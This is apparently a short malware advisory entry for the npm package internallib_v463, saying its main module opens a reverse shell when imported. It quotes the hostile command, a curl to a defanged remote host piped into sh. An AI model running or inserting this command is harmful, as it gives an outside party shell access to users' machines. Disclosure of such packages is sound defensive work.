  "summary": "Malicious code in internallib_v463 (npm)",
  "details": "The package's main module (index.js) executes a reverse shell on require: it runs /bin/bash -c \"curl hxxps://reverse-shell[.]sh/10[.]0[.]73[.]186:443|sh\", piping a remote shell script into sh and connecting back to 10[.]0[.]73[.]186:443. Any application that imports this package gives the remote host shell access to the machine.",
